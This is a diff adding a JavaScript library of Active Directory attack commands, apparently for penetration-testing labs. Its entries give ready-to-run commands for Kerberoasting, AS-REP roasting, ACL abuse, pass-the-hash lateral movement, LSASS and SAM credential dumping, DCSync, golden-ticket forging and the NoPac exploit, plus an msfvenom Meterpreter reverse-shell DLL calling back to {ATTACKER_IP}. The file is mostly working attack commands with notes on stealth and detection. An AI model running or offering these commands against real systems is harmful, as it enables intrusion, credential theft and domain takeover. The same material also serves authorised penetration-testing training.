+cmd:"GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USERNAME} -request-user {TARGET_USER} -outputfile {TARGET_USER}_tgs.txt",
+failureIndicators:['User not found','No SPN set'],
+notes:'Target specific high-value accounts'},
+
+{id:'KERB_004',phase:'credential-access',title:'GetUserSPNs Cross Domain',desc:'Kerberoast across forest trust',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:'GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL {DOMAIN}/{USERNAME}',
+failureIndicators:['Trust not found','Access denied'],
+notes:'Cross-forest Kerberoasting'},
+
+{id:'KERB_005',phase:'credential-access',title:'setspn Enum',desc:'Windows native SPN enumeration',tool:'setspn',os:'windows',noise:'low',auth:'required',
+cmd:'setspn.exe -Q */*',
+failureIndicators:['Command not found'],
+notes:'Built-in Windows SPN enumeration'},
+
+{id:'KERB_006',phase:'credential-access',title:'setspn Domain',desc:'Enumerate all SPNs in domain',tool:'setspn',os:'windows',noise:'low',auth:'required',
+cmd:'setspn.exe -T {DOMAIN} -Q */*',
+failureIndicators:['Domain not found','Access denied'],
+notes:'Comprehensive SPN listing'},
+
+{id:'KERB_007',phase:'credential-access',title:'PowerView Kerberoast',desc:'Kerberoast with PowerView',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:"Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tgs.csv -NoTypeInformation",
+failureIndicators:['PowerView not loaded','No SPNs found'],
+notes:'Export for offline cracking'},
+
+{id:'KERB_008',phase:'credential-access',title:'PowerView Single User',desc:'Kerberoast specific user',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -Identity {TARGET_USER} | Get-DomainSPNTicket -Format Hashcat',
+failureIndicators:['User not found','No SPN set'],
+notes:'Target specific accounts'},
+
+{id:'KERB_009',phase:'credential-access',title:'Rubeus Stats',desc:'Get Kerberoast statistics',tool:'Rubeus',os:'windows',noise:'low',auth:'required',
+cmd:'.\\Rubeus.exe kerberoast /stats',
+failureIndicators:['AV detection','Access denied'],
+notes:'See how many accounts are Kerberoastable'},
+
+{id:'KERB_010',phase:'credential-access',title:'Rubeus Kerberoast All',desc:'Kerberoast all accounts',tool:'Rubeus',os:'windows',noise:'med',auth:'required',
+cmd:'.\\Rubeus.exe kerberoast /nowrap',
+failureIndicators:['AV detection','No SPNs found'],
+notes:'/nowrap prevents line breaks in output'},
+
+{id:'KERB_011',phase:'credential-access',title:'Rubeus AdminCount',desc:'Kerberoast admin accounts only',tool:'Rubeus',os:'windows',noise:'low',auth:'required',
+cmd:".\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap",
+failureIndicators:['AV detection','No admin SPNs'],
+notes:'Target high-value accounts'},
+
+{id:'KERB_012',phase:'credential-access',title:'Rubeus Target User',desc:'Kerberoast specific user',tool:'Rubeus',os:'windows',noise:'low',auth:'required',
+cmd:'.\\Rubeus.exe kerberoast /user:{TARGET_USER} /nowrap',
+failureIndicators:['User not found','No SPN set'],
+notes:'Targeted Kerberoasting'},
+
+{id:'KERB_013',phase:'credential-access',title:'Rubeus Cross Domain',desc:'Kerberoast across domain',tool:'Rubeus',os:'windows',noise:'med',auth:'required',
+cmd:'.\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap',
+failureIndicators:['Domain not reachable','User not found'],
+notes:'Cross-domain Kerberoasting'},
+
+{id:'KERB_014',phase:'credential-access',title:'Hashcat TGS',desc:'Crack Kerberoast hashes',tool:'Hashcat',os:'linux',noise:'low',auth:'none',
+cmd:'hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -O --force',
+failureIndicators:['No passwords cracked','Invalid hash format'],
+notes:'Add -r rules for better success'},
+
+{id:'KERB_015',phase:'credential-access',title:'Mimikatz Base64 Tickets',desc:'Export tickets in base64 format',tool:'Mimikatz',os:'windows',noise:'med',auth:'required',
+cmd:'mimikatz # base64 /out:true\nkerberos::list /export',
+failureIndicators:['AV detection','Privilege error'],
+notes:'Export for offline cracking'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: CREDENTIAL ACCESS - AS-REP Roasting
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'ASREP_001',phase:'credential-access',title:'GetNPUsers User List',desc:'AS-REP roast from user list (no creds)',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:'GetNPUsers.py -dc-ip {DC_IP} -usersfile users.txt -format hashcat -outputfile asrep.txt {DOMAIN}/',
+failureIndicators:['No users found','Connection error'],
+notes:'Works WITHOUT credentials!'},
+
+{id:'ASREP_002',phase:'credential-access',title:'GetNPUsers With Creds',desc:'AS-REP roast with valid credentials',tool:'Impacket',os:'linux',noise:'low',auth:'required',
+cmd:"GetNPUsers.py -dc-ip {DC_IP} '{DOMAIN}/{USERNAME}:{PASSWORD}' -request -format hashcat -outputfile asrep.txt",
+failureIndicators:['Authentication failure','No vulnerable users'],
+notes:'Queries AD for all DONT_REQ_PREAUTH users'},
+
+{id:'ASREP_003',phase:'credential-access',title:'Rubeus ASREProast',desc:'AS-REP roast from Windows',tool:'Rubeus',os:'windows',noise:'low',auth:'none',
+cmd:'.\\Rubeus.exe asreproast /user:{TARGET_USER} /nowrap /format:hashcat',
+failureIndicators:['User not vulnerable','AV detection'],
+notes:'Target specific user'},
+
+{id:'ASREP_004',phase:'credential-access',title:'Rubeus ASREProast All',desc:'AS-REP roast all vulnerable users',tool:'Rubeus',os:'windows',noise:'low',auth:'none',
+cmd:'.\\Rubeus.exe asreproast /nowrap /format:hashcat',
+failureIndicators:['No vulnerable users','AV detection'],
+notes:'Finds and roasts all vulnerable users'},
+
+{id:'ASREP_005',phase:'credential-access',title:'Hashcat AS-REP',desc:'Crack AS-REP hashes',tool:'Hashcat',os:'linux',noise:'low',auth:'none',
+cmd:'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O --force',
+failureIndicators:['No passwords cracked','Invalid hash format'],
+notes:'AS-REP hashes are often easier to crack'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: CREDENTIAL ACCESS - GPP Passwords
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'GPP_001',phase:'credential-access',title:'gpp-decrypt',desc:'Decrypt GPP cpassword',tool:'gpp-decrypt',os:'linux',noise:'low',auth:'none',
+cmd:"gpp-decrypt '<cpassword>'",
+failureIndicators:['Invalid cpassword format'],
+notes:'GPP passwords use known AES key'},
+
+{id:'GPP_002',phase:'credential-access',title:'CME GPP Password',desc:'Find GPP passwords in SYSVOL',tool:'CrackMapExec',os:'linux',noise:'low',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M gpp_password",
+failureIndicators:['No GPP passwords found','Access denied'],
+notes:'Searches SYSVOL XML files for cpassword'},
+
+{id:'GPP_003',phase:'credential-access',title:'CME GPP Autologin',desc:'Find autologin credentials in GPO',tool:'CrackMapExec',os:'linux',noise:'low',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M gpp_autologin",
+failureIndicators:['No autologin creds found','Access denied'],
+notes:'Finds credentials stored for autologon'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: PRIVILEGE ESCALATION - ACL Attacks
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'ACL_001',phase:'privilege-escalation',title:'Find-InterestingDomainAcl',desc:'Find exploitable ACL misconfigurations',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:'Find-InterestingDomainAcl -ResolveGUIDs',
+failureIndicators:['PowerView not loaded','Timeout on large domains'],
+notes:'Can take a long time on large domains'},
+
+{id:'ACL_002',phase:'privilege-escalation',title:'Get User ACLs',desc:'Find objects user has rights over',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Import-Module .\\PowerView.ps1\n$sid = Convert-NameToSid {USERNAME}\nGet-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}",
+failureIndicators:['PowerView not loaded','User not found'],
+notes:'Check what your user can modify'},
+
+{id:'ACL_003',phase:'privilege-escalation',title:'ACL with GUIDs Resolved',desc:'Get ACLs with readable GUID names',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'More readable ACL output'},
+
+{id:'ACL_004',phase:'privilege-escalation',title:'ACL Reverse GUID Search',desc:'Map GUID to extended right name',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"$guid= '00299570-246d-11d0-a768-00aa006e0529'\nGet-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl",
+failureIndicators:['GUID not found','Module not loaded'],
+notes:'Lookup what an ACL GUID means'},
+
+{id:'ACL_005',phase:'privilege-escalation',title:'ACL From File',desc:'Check ACLs for multiple users from file',tool:'PowerShell',os:'windows',noise:'med',auth:'required',
+cmd:"foreach($line in [System.IO.File]::ReadLines('C:\\Users\\htb-student\\Desktop\\ad_users.txt')) {get-acl \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}",
+failureIndicators:['File not found','Access denied'],
+notes:'Batch ACL enumeration'},
+
+{id:'ACL_006',phase:'privilege-escalation',title:'Create PSCredential',desc:'Create credential object for ACL abuse',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"$SecPassword = ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\\{USERNAME}', $SecPassword)",
+failureIndicators:['Invalid credentials'],
+notes:'Required for many ACL abuse commands'},
+
+{id:'ACL_007',phase:'privilege-escalation',title:'ForceChangePassword',desc:'Abuse ACL to reset user password',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:"$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\nSet-DomainUserPassword -Identity {TARGET_USER} -AccountPassword $damundsenPassword -Credential $Cred -Verbose",
+failureIndicators:['Access denied','Insufficient rights'],
+warning:'Changes target password - user WILL notice!',
+notes:'Requires ForceChangePassword right on target'},
+
+{id:'ACL_008',phase:'privilege-escalation',title:'Add-DomainGroupMember',desc:'Add user to privileged group',tool:'PowerView',os:'windows',noise:'high',auth:'required',
+cmd:"Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members '{USERNAME}' -Credential $Cred -Verbose",
+failureIndicators:['Access denied','Group not found'],
+warning:'Highly visible change!',
+notes:'Requires GenericAll/WriteProperty on group'},
+
+{id:'ACL_009',phase:'privilege-escalation',title:'View Group Members',desc:'Verify group membership change',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName",
+failureIndicators:['Group not found','PowerView not loaded'],
+notes:'Verify ACL abuse worked'},
+
+{id:'ACL_010',phase:'privilege-escalation',title:'Set Fake SPN',desc:'Set SPN for targeted Kerberoasting',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:"Set-DomainObject -Credential $Cred -Identity {TARGET_USER} -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose",
+failureIndicators:['Access denied','Insufficient rights'],
+notes:'Requires GenericWrite on user - enables Kerberoasting'},
+
+{id:'ACL_011',phase:'privilege-escalation',title:'Clear Fake SPN',desc:'Remove fake SPN after Kerberoasting',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Set-DomainObject -Credential $Cred -Identity {TARGET_USER} -Clear serviceprincipalname -Verbose',
+failureIndicators:['Access denied'],
+notes:'Cleanup after targeted Kerberoasting'},
+
+{id:'ACL_012',phase:'privilege-escalation',title:'Remove from Group',desc:'Remove user from group (cleanup)',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:"Remove-DomainGroupMember -Identity 'Help Desk Level 1' -Members '{USERNAME}' -Credential $Cred -Verbose",
+failureIndicators:['Access denied','Member not found'],
+notes:'Cleanup after ACL abuse'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: LATERAL MOVEMENT - Remote Access
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'LAT_001',phase:'lateral-movement',title:'xfreerdp RDP',desc:'Remote Desktop connection',tool:'xfreerdp',os:'linux',noise:'med',auth:'required',
+cmd:"xfreerdp /u:{USERNAME}@{DOMAIN} /p:'{PASSWORD}' /v:{TARGET_HOST}",
+failureIndicators:['Connection refused','Authentication failure','NLA errors'],
+notes:'Add +clipboard /drive:share,/tmp for file transfer'},
+
+{id:'LAT_002',phase:'lateral-movement',title:'psexec.py Shell',desc:'SYSTEM shell via SMB admin shares',tool:'Impacket',os:'linux',noise:'high',auth:'required',
+cmd:"psexec.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_HOST}",
+failureIndicators:['Authentication failure','Access denied','AV blocked'],
+warning:'Creates service and writes to disk - NOISY!',
+notes:'Drops executable, creates service. Very detectable'},
+
+{id:'LAT_003',phase:'lateral-movement',title:'psexec.py Kerberos',desc:'psexec with Kerberos authentication',tool:'Impacket',os:'linux',noise:'high',auth:'required',
+cmd:'psexec.py {DOMAIN}/hacker@{DC_NAME} -k -no-pass -target-ip {DC_IP}',
+failureIndicators:['Kerberos error','No TGT in cache'],
+notes:'Requires valid Kerberos ticket in cache'},
+
+{id:'LAT_004',phase:'lateral-movement',title:'wmiexec.py Shell',desc:'Shell via WMI (stealthier than psexec)',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:"wmiexec.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_HOST}",
+failureIndicators:['Authentication failure','WMI blocked'],
+notes:'No service creation - stealthier than psexec'},
+
+{id:'LAT_005',phase:'lateral-movement',title:'Evil-WinRM',desc:'WinRM shell access',tool:'Evil-WinRM',os:'linux',noise:'low',auth:'required',
+cmd:"evil-winrm -i {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}'",
+failureIndicators:['Connection refused','Authentication failure','WinRM disabled'],
+notes:'WinRM must be enabled (port 5985/5986)'},
+
+{id:'LAT_006',phase:'lateral-movement',title:'Evil-WinRM PTH',desc:'Pass-the-Hash via WinRM',tool:'Evil-WinRM',os:'linux',noise:'low',auth:'required',
+cmd:'evil-winrm -i {TARGET_HOST} -u {USERNAME} -H {NTHASH}',
+failureIndicators:['Connection refused','Authentication failure'],
+notes:'Use NTLM hash instead of password'},
+
+{id:'LAT_007',phase:'lateral-movement',title:'Enter-PSSession',desc:'Native PowerShell remoting',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"$password = ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\\{USERNAME}', $password)\nEnter-PSSession -ComputerName {TARGET_HOST} -Credential $cred",
+failureIndicators:['WinRM disabled','Access denied'],
+notes:'Native Windows remoting'},
+
+{id:'LAT_008',phase:'lateral-movement',title:'Enter-PSSession Cross-Forest',desc:'PS session across forest trust',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Enter-PSSession -ComputerName {DC_NAME}.FREIGHTLOGISTICS.LOCAL -Credential {DOMAIN}\\administrator',
+failureIndicators:['Trust error','Access denied'],
+notes:'Cross-forest lateral movement'},
+
+{id:'LAT_009',phase:'lateral-movement',title:'CME Command Execution',desc:'Execute command via CrackMapExec',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'",
+failureIndicators:['Authentication failure','Command blocked'],
+notes:'Use -X for PowerShell commands'},
+
+{id:'LAT_010',phase:'lateral-movement',title:'CME PTH Spray',desc:'Pass-the-Hash across subnet',tool:'CrackMapExec',os:'linux',noise:'high',auth:'required',
+cmd:'crackmapexec smb {NETWORK}.0/24 -u {USERNAME} -H {NTHASH}',
+failureIndicators:['No valid hosts','Network error'],
+warning:'NOISY - touches many hosts!',
+notes:'Find where hash is valid'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: LATERAL MOVEMENT - SQL Server
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'SQL_001',phase:'lateral-movement',title:'Get-SQLInstanceDomain',desc:'Discover SQL Server instances',tool:'PowerUpSQL',os:'windows',noise:'low',auth:'required',
+cmd:'Get-SQLInstanceDomain',
+failureIndicators:['Module not loaded','No instances found'],
+notes:'Find SQL Servers in domain'},
+
+{id:'SQL_002',phase:'lateral-movement',title:'Get-SQLQuery',desc:'Execute SQL query on server',tool:'PowerUpSQL',os:'windows',noise:'low',auth:'required',
+cmd:"Get-SQLQuery -Verbose -Instance '172.16.5.150,1433' -username '{DOMAIN}\\{USERNAME}' -password '{PASSWORD}' -query 'Select @@version'",
+failureIndicators:['Connection failed','Access denied'],
+notes:'Test SQL Server access'},
+
+{id:'SQL_003',phase:'lateral-movement',title:'mssqlclient.py',desc:'Connect to MSSQL server from Linux',tool:'Impacket',os:'linux',noise:'low',auth:'required',
+cmd:'mssqlclient.py {DOMAIN}/{USERNAME}@{TARGET_HOST} -windows-auth',
+failureIndicators:['Connection failed','Authentication error'],
+notes:'Interactive SQL shell'},
+
+{id:'SQL_004',phase:'lateral-movement',title:'enable_xp_cmdshell',desc:'Enable xp_cmdshell for command execution',tool:'MSSQL',os:'both',noise:'med',auth:'required',
+cmd:'SQL> enable_xp_cmdshell',
+failureIndicators:['Permission denied','Feature disabled'],
+warning:'Enables command execution via SQL!',
+notes:'Run from mssqlclient shell'},
+
+{id:'SQL_005',phase:'lateral-movement',title:'xp_cmdshell whoami',desc:'Execute OS command via SQL',tool:'MSSQL',os:'both',noise:'med',auth:'required',
+cmd:'xp_cmdshell whoami /priv',
+failureIndicators:['xp_cmdshell disabled','Permission denied'],
+notes:'SQL Server command execution'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: CREDENTIAL ACCESS - Credential Dumping
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'DUMP_001',phase:'credential-access',title:'Mimikatz LogonPasswords',desc:'Dump credentials from LSASS memory',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',
+cmd:'mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords',
+failureIndicators:['Privilege not held','AV detection','Credential Guard'],
+warning:'Detected by most AV/EDR!',
+notes:'May not work with Credential Guard enabled'},
+
+{id:'DUMP_002',phase:'credential-access',title:'Mimikatz SAM Dump',desc:'Dump local SAM database hashes',tool:'Mimikatz',os:'windows',noise:'med',auth:'required',
+cmd:'mimikatz # privilege::debug\nmimikatz # lsadump::sam',
+failureIndicators:['Privilege not held','AV detection'],
+notes:'Extract local account hashes'},
+
+{id:'DUMP_003',phase:'credential-access',title:'secretsdump Remote',desc:'Remote credential dump via Impacket',tool:'Impacket',os:'linux',noise:'high',auth:'required',
+cmd:"secretsdump.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_HOST}",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'Extracts SAM, LSA secrets, cached creds'},
+
+{id:'DUMP_004',phase:'credential-access',title:'CME SAM Dump',desc:'Dump SAM via CrackMapExec',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}' --sam",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'Extract local account hashes'},
+
+{id:'DUMP_005',phase:'credential-access',title:'CME LSA Secrets',desc:'Dump LSA secrets via CrackMapExec',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}' --lsa",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'May contain service account passwords'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: DOMAIN DOMINANCE - DCSync
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'DCSYNC_001',phase:'domain-dominance',title:'Check Replication Rights',desc:'Verify user has DCSync rights',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"$sid= 'S-1-5-21-3842939050-3880317879-2865463114-1164'\nGet-ObjectAcl 'DC=inlanefreight,DC=local' -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl",
+failureIndicators:['No replication rights found','PowerView not loaded'],
+notes:'Check before attempting DCSync'},
+
+{id:'DCSYNC_002',phase:'domain-dominance',title:'secretsdump DCSync All',desc:'DCSync all domain hashes',tool:'Impacket',os:'linux',noise:'high',auth:'required',
+cmd:"secretsdump.py -just-dc '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}",
+failureIndicators:['Access denied','Insufficient replication rights'],
+warning:'Dumps entire domain credential database!',
+notes:'Requires Replicating Directory Changes rights'},
+
+{id:'DCSYNC_003',phase:'domain-dominance',title:'secretsdump KRBTGT',desc:'DCSync just krbtgt for Golden Ticket',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:"secretsdump.py -just-dc-user krbtgt '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}",
+failureIndicators:['Access denied','Insufficient rights'],
+notes:'Get krbtgt hash for Golden Ticket'},
+
+{id:'DCSYNC_004',phase:'domain-dominance',title:'secretsdump Target User',desc:'DCSync specific user',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:"secretsdump.py -just-dc-user {TARGET_USER} '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}",
+failureIndicators:['User not found','Access denied'],
+notes:'Target specific high-value accounts'},
+
+{id:'DCSYNC_005',phase:'domain-dominance',title:'secretsdump VSS',desc:'DCSync using Volume Shadow Copy',tool:'Impacket',os:'linux',noise:'high',auth:'required',
+cmd:"secretsdump.py -outputfile hashes -just-dc {DOMAIN}/{USERNAME}@{DC_IP} -use-vss",
+failureIndicators:['VSS error','Access denied'],
+notes:'Alternative method using shadow copy'},
+
+{id:'DCSYNC_006',phase:'domain-dominance',title:'secretsdump PTH',desc:'DCSync with NTLM hash',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:"secretsdump.py '{DC_NAME}$'@{DC_IP} -hashes aad3b435b51404eeaad3b435b51404ee:{NTHASH}",
+failureIndicators:['Invalid hash','Access denied'],
+notes:'Use machine account hash'},
+
+{id:'DCSYNC_007',phase:'domain-dominance',title:'secretsdump Kerberos',desc:'DCSync with Kerberos auth',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:"secretsdump.py -just-dc-user {DOMAIN}/administrator -k -no-pass '{DC_NAME}$'@{DC_NAME}",
+failureIndicators:['Kerberos error','No TGT in cache'],
+notes:'Use Kerberos ticket instead of password'},
+
+{id:'DCSYNC_008',phase:'domain-dominance',title:'Mimikatz DCSync',desc:'DCSync via Mimikatz',tool:'Mimikatz',os:'windows',noise:'med',auth:'required',
+cmd:'mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{DOMAIN}\\administrator',
+failureIndicators:['Access denied','AV detection'],
+notes:'Windows-based DCSync'},
+
+{id:'DCSYNC_009',phase:'domain-dominance',title:'Mimikatz DCSync krbtgt',desc:'DCSync krbtgt hash',tool:'Mimikatz',os:'windows',noise:'med',auth:'required',
+cmd:'mimikatz # lsadump::dcsync /user:{DOMAIN}\\krbtgt',
+failureIndicators:['Access denied','AV detection'],
+notes:'Get krbtgt for Golden Ticket'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: DOMAIN DOMINANCE - Trust Attacks
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'TRUST_001',phase:'domain-dominance',title:'lookupsid.py',desc:'Enumerate SIDs across trust',tool:'Impacket',os:'linux',noise:'low',auth:'required',
+cmd:"lookupsid.py {DOMAIN}/{USERNAME}@{DC_IP}",
+failureIndicators:['Authentication failure','Trust not found'],
+notes:'Enumerate users and groups by SID'},
+
+{id:'TRUST_002',phase:'domain-dominance',title:'Get Domain SID',desc:'Get SID for target domain',tool:'Impacket',os:'linux',noise:'low',auth:'required',
+cmd:"lookupsid.py {DOMAIN}/{USERNAME}@{DC_IP} | grep 'Domain SID'",
+failureIndicators:['SID not found'],
+notes:'Needed for Golden Ticket with ExtraSID'},
+
+{id:'TRUST_003',phase:'domain-dominance',title:'Get Enterprise Admins SID',desc:'Get EA group SID',tool:'Impacket',os:'linux',noise:'low',auth:'required',
+cmd:"lookupsid.py {DOMAIN}/{USERNAME}@{DC_IP} | grep -B12 'Enterprise Admins'",
+failureIndicators:['Group not found'],
+notes:'Needed for ExtraSID attack'},
+
+{id:'TRUST_004',phase:'domain-dominance',title:'ticketer.py Golden Ticket',desc:'Create Golden Ticket with ExtraSID',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:'ticketer.py -nthash <KRBTGT_HASH> -domain {DOMAIN} -domain-sid <DOMAIN_SID> -extra-sid <EA_SID> hacker',
+failureIndicators:['Invalid hash','Wrong SID format'],
+notes:'Create ticket with Enterprise Admin privileges'},
+
+{id:'TRUST_005',phase:'domain-dominance',title:'Use Golden Ticket',desc:'Access resources with forged ticket',tool:'Impacket',os:'linux',noise:'med',auth:'none',
+cmd:'export KRB5CCNAME=hacker.ccache\npsexec.py {DOMAIN}/hacker@{DC_NAME} -k -no-pass -target-ip {DC_IP}',
+failureIndicators:['Ticket error','Access denied'],
+notes:'Use forged ticket for access'},
+
+{id:'TRUST_006',phase:'domain-dominance',title:'raiseChild.py',desc:'Auto child-to-parent domain escalation',tool:'Impacket',os:'linux',noise:'high',auth:'required',
+cmd:"raiseChild.py -target-exec {DC_IP} '{DOMAIN}/{USERNAME}:{PASSWORD}'",
+failureIndicators:['No trust found','Insufficient privileges'],
+warning:'Requires DA in child domain!',
+notes:'Automatically creates Golden Ticket with EA SID'},
+
+{id:'TRUST_007',phase:'domain-dominance',title:'Mimikatz Golden Ticket ExtraSID',desc:'Create Golden Ticket with ExtraSID via Mimikatz',tool:'Mimikatz',os:'windows',noise:'low',auth:'required',
+cmd:'mimikatz # kerberos::golden /user:hacker /domain:{DOMAIN} /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<EA_SID> /ptt',
+failureIndicators:['Invalid parameters','AV detection'],
+notes:'/ptt injects ticket into current session'},
+
+{id:'TRUST_008',phase:'domain-dominance',title:'Rubeus Golden Ticket',desc:'Create Golden Ticket via Rubeus',tool:'Rubeus',os:'windows',noise:'low',auth:'required',
+cmd:'.\\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:{DOMAIN} /sid:<DOMAIN_SID> /sids:<EA_SID> /user:hacker /ptt',
+failureIndicators:['AV detection','Invalid hash'],
+notes:'Rubeus-based Golden Ticket creation'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: DOMAIN DOMINANCE - CVE Exploits
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'CVE_001',phase:'domain-dominance',title:'NoPac Scanner',desc:'Check if target is vulnerable to NoPac',tool:'NoPac',os:'linux',noise:'low',auth:'required',
+cmd:"python3 scanner.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -use-ldap",
+failureIndicators:['Not vulnerable','Connection error'],
+notes:'CVE-2021-42278/42287 vulnerability check'},
+
+{id:'CVE_002',phase:'domain-dominance',title:'NoPac Exploit Shell',desc:'Exploit NoPac for SYSTEM shell',tool:'NoPac',os:'linux',noise:'high',auth:'required',
+cmd:"python3 noPac.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} -shell --impersonate administrator -use-ldap",
+failureIndicators:['Not vulnerable','Exploit failed'],
+warning:'Critical vulnerability exploit!',
+notes:'Get SYSTEM shell on DC'},
+
+{id:'CVE_003',phase:'domain-dominance',title:'NoPac DCSync',desc:'Use NoPac to perform DCSync',tool:'NoPac',os:'linux',noise:'high',auth:'required',
+cmd:"python3 noPac.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} --impersonate administrator -use-ldap -dump -just-dc-user {NETBIOS}/administrator",
+failureIndicators:['Not vulnerable','Dump failed'],
+notes:'Direct to DCSync via NoPac'},
+
+{id:'CVE_004',phase:'domain-dominance',title:'PrintNightmare Check RPC',desc:'Check if Print Spooler RPC is exposed',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:"rpcdump.py @{DC_IP} | egrep 'MS-RPRN|MS-PAR'",
+failureIndicators:['RPC not exposed'],
+notes:'Check for PrintNightmare vulnerability'},
+
+{id:'CVE_005',phase:'domain-dominance',title:'PrintNightmare Generate DLL',desc:'Create malicious DLL payload',tool:'msfvenom',os:'linux',noise:'low',auth:'none',
+cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=8080 -f dll > backupscript.dll',
+failureIndicators:['Generation error'],
+notes:'Create payload for PrintNightmare'},
+
